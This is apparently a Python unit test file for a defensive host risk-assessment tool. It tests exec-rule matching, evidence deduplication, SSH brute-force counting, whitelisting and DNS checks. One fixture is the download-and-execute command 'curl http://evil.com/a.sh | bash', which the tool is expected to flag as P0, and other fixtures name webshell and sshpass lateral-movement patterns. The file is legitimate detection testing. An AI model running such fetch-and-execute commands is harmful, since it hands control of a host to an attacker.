"""Unit tests for risk-identification assess.py."""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS))

from assess import assess, dedupe_source_bundles, load_scenarios, recommended_next  # noqa: E402
from exec_rules import match_exec_rules  # noqa: E402


class TestExecRules(unittest.TestCase):
    def test_p0_download_execute(self) -> None:
        ev = {
            "listener_port": 443,
            "listener_process": "nginx",
            "exe": "/bin/bash",
            "command": ["/bin/sh", "-c", "curl http://evil.com/a.sh | bash"],
        }
        sev, matched, _ = match_exec_rules(ev)
        self.assertEqual(sev, "P0")
        self.assertIn("download_and_execute", matched)


class TestAssess(unittest.TestCase):
    def setUp(self) -> None:
        self.catalog = load_scenarios(SCRIPTS.parent / "scenarios.json")
        example = json.loads((SCRIPTS / "input.example.json").read_text(encoding="utf-8"))
        self.payload = example

    def test_reuploaded_evidence_is_counted_once_with_auditable_references(self):
        event = {**self.payload["evidence_bundles"]["host_exec"][0],
                 "audit_id": "native-audit", "evidence_id": "old-v2-a", "__tag__:__pack_id__": "a"}
        duplicate = {**event, "evidence_id": "old-v2-b", "__tag__:__pack_id__": "b"}
        payload = {**self.payload, "evidence_bundles": {"host_exec": [event, duplicate]}}
        single = assess({**payload, "evidence_bundles": {"host_exec": [event]}}, self.catalog)
        replayed = assess(payload, self.catalog)
        self.assertEqual(single["summary"], replayed["summary"])
        self.assertEqual(replayed["evidence_deduplication"]["host_exec"]["duplicates_removed"], 1)
        self.assertEqual(replayed["evidence_deduplication"]["host_exec"]["aliases"],
                         [{"retained_evidence_id": "old-v2-a", "duplicate_evidence_id": "old-v2-b"}])
        self.assertEqual(len(payload["evidence_bundles"]["host_exec"]), 2)

    def test_native_dedup_keeps_distinct_and_anonymous_events(self):
        event = {"host": "test", "timestamp": "2026-09-17T00:00:00Z", "event_id": "source-1", "file_path": "/a"}
        other = {**event, "file_path": "/b"}
        anonymous = {"host": "test", "timestamp": event["timestamp"]}
        bundles, audit = dedupe_source_bundles({"host_file_op": [event, other, anonymous, anonymous]})
        self.assertEqual(len(bundles["host_file_op"]), 4)
        self.assertEqual(audit["host_file_op"]["duplicates_removed"], 0)

    def test_reuploads_cannot_manufacture_ssh_bruteforce(self):
        event = {"host": "192.0.2.10", "timestamp": "2026-09-17T00:00:00Z", "event_id": "auth-1",
                 "src_ip": "192.0.2.20", "result": "failed", "user": "root"}
        payload = {"scenario": "S5", "risk_modules": ["ssh"], "params": {},
                   "evidence_bundles": {"ssh_auth": [
                       {**event, "evidence_id": f"old-{i}", "__tag__:__pack_id__": str(i)} for i in range(20)]}}
        replay = assess(payload, self.catalog)
        self.assertEqual(replay["summary"]["ssh_brute_waves"], 0)
        self.assertEqual(replay["summary"]["total_events_scanned"], 1)
        for i, row in enumerate(payload["evidence_bundles"]["ssh_auth"]):
            row["event_id"] = f"auth-{i}"
        distinct = assess(payload, self.catalog)
        self.assertGreater(distinct["summary"]["ssh_brute_waves"], 0)

    def test_high_risk_detected(self) -> None:
        result = assess(self.payload, self.catalog)
        self.assertEqual(result["overall_verdict"], "high_risk_detected")
        self.assertGreaterEqual(result["summary"]["p0"], 1)
        self.assertTrue(result["risk_items"])

    def test_blocked_without_exec(self) -> None:
        payload = {
            **self.payload,
            "completeness_precheck": {
                "overall_verdict": "not_traceable",
                "confidence": 0.3,
                "next_skill_blocked": True,
            },
            "evidence_bundles": {"host_exec": [], "host_connect": []},
        }
        result = assess(payload, self.catalog)
        self.assertEqual(result["overall_verdict"], "insufficient_data")

    def test_severity_floor(self) -> None:
        payload = {
            **self.payload,
            "params": {**self.payload["params"], "severity_floor": "P0"},
        }
        result = assess(payload, self.catalog)
        for item in result["risk_items"]:
            self.assertIn(item["severity"], ("P0",))

    def test_source_coverage_full(self) -> None:
        result = assess(self.payload, self.catalog)
        self.assertEqual(result["coverage_level"], "partial")
        self.assertIn("host_exec", result["data_source_status"])
        self.assertEqual(result["data_source_status"]["host_exec"]["status"], "present")
        self.assertTrue(result["risk_coverage"]["available_rule_ids"])

    def test_missing_connect_reminds_user(self) -> None:
        payload = {
            **self.payload,
            "evidence_bundles": {
                **self.payload["evidence_bundles"],
                "host_connect": [],
            },
        }
        result = assess(payload, self.catalog)
        self.assertNotIn("connect", result["risk_modules_run"])
        self.assertTrue(
            any("host_connect" in r or "外连" in r for r in result["user_reminders"]),
            result["user_reminders"],
        )
        unavailable = result["risk_coverage"]["unavailable_rules"]
        rule_ids = {u["rule_id"] for u in unavailable}
        self.assertIn("external_c2_connect", rule_ids)

    def test_whitelist_applied_by_default(self) -> None:
        example_path = (
            SCRIPTS.parents[3]
            / "examples"
            / "risk-identification"
            / "s5-nginx-config-test-whitelisted.json"
        )
        payload = json.loads(example_path.read_text(encoding="utf-8"))
        result = assess(payload, self.catalog)
        self.assertTrue(result.get("whitelist", {}).get("applied"))
        nginx_items = [it for it in result["risk_items"] if "nginx" in str(it.get("command", ""))]
        self.assertTrue(nginx_items)
        self.assertTrue(nginx_items[0].get("whitelisted"))
        self.assertEqual(nginx_items[0].get("whitelist_rule_id"), "wl-nginx-config-test")

    def test_whitelist_opt_out(self) -> None:
        payload = {**self.payload, "whitelist": {"enabled": False}}
        result = assess(payload, self.catalog)
        self.assertFalse(result.get("whitelist", {}).get("applied"))

    def test_behavior_policy_applied(self) -> None:
        result = assess(self.payload, self.catalog)
        self.assertTrue(result.get("behavior_policy", {}).get("applied"))
        self.assertFalse(Path(result["whitelist"]["path"]).is_absolute())
        self.assertTrue(result.get("detection_rules"))
        for path in result["detection_rules"].values():
            self.assertFalse(Path(path).is_absolute())
        self.assertTrue(result.get("policy_hits"))
        self.assertTrue(result.get("top_incidents") is not None)
        for item in result["risk_items"]:
            self.assertIn("policy_rule_id", item)
            self.assertIn("alert_required", item)

    def test_connect_only_scenario(self) -> None:
        payload = {
            **self.payload,
            "scenario": "S5-CONNECT",
            "risk_modules": ["connect"],
        }
        result = assess(payload, self.catalog)
        self.assertEqual(result["coverage_level"], "full")
        self.assertIn("connect", result["risk_modules_run"])

    def test_s8_runs_dns_module(self) -> None:
        payload = {
            **self.payload,
            "scenario": "S8",
            "risk_modules": ["connect", "dns"],
            "params": {
                "host": "192.0.2.91",
                "time_start": "2026-07-01T10:00:00+08:00",
                "time_end": "2026-07-01T10:10:00+08:00",
            },
            "evidence_bundles": {
                "host_connect": [
                    {
                        "evidence_id": "conn-1",
                        "host": "192.0.2.91",
                        "timestamp": "2026-07-01T10:00:30+08:00",
                        "listener_port": 443,
                        "listener_process": "nginx",
                        "dst_ip": "1.1.1.1",
                        "dst_port": 443,
                    }
                ],
                "dns_log": [
                    {
                        "evidence_id": "dns-1",
                        "client_ip": "192.0.2.91",
                        "timestamp": "2026-07-01T10:00:20+08:00",
                        "query": "x8f7d6s5a4q3w2e1r0t9.xyz",
                        "rcode": "NOERROR",
                    }
                ],
            },
        }
        result = assess(payload, self.catalog)
        self.assertIn("dns", result["risk_modules_run"])
        self.assertTrue(any(item["risk_module"] == "dns" for item in result["risk_items"]))

    def test_recommended_next_waf_only(self) -> None:
        items = [
            {
                "host": "192.0.2.91",
                "severity": "P0",
                "alert_required": True,
                "alert_suppressed": False,
                "policy_rule_id": "WEB-SHELL-001",
                "summary": "curl webshell",
            },
        ]
        recs = recommended_next(items, {"waf_alert": [{"alert_id": "WAF-1"}]})
        self.assertEqual(len(recs), 1)
        self.assertEqual(recs[0]["skill"], "alert-confirmation")

    def test_recommended_next_no_traceability(self) -> None:
        items = [
            {
                "host": "192.0.2.91",
                "severity": "P0",
                "alert_required": True,
                "alert_suppressed": False,
                "policy_rule_id": "LATERAL-SSH-001",
                "summary": "sshpass devops@192.0.2.92",
            },
            {
                "host": "192.0.2.92",
                "severity": "P0",
                "alert_required": True,
                "alert_suppressed": False,
                "policy_rule_id": "SSH-BRUTE-001",
                "src_ip": "192.0.2.91",
                "summary": "SSH brute from 91",
            },
        ]
        recs = recommended_next(items, {})
        self.assertFalse(any(r.get("skill") == "traceability-analysis" for r in recs))


if __name__ == "__main__":
    unittest.main()
